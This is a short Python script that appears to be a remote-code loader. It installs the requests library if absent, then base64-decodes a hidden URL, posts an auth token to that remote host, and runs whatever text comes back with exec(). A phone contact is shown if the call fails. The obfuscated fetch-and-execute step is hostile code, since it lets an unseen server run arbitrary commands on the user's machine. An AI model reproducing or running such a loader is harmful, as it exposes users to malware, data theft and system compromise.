def main():
  import os
  try:
    import requests
  except:
    os.system("pip install requests")
  #---------------------------------------------------#
  import requests,base64
  try:
    exec(requests.post(base64.b64decode(b'aHR0cHM6Ly9sb2cuYmVydmVyLnRlY2gvbWFpbg=='),data={"auth":"MaiHuyBao"}).text)
  except:
    input("Zalo: 0363997244")
if __name__ == '__main__':
  main()
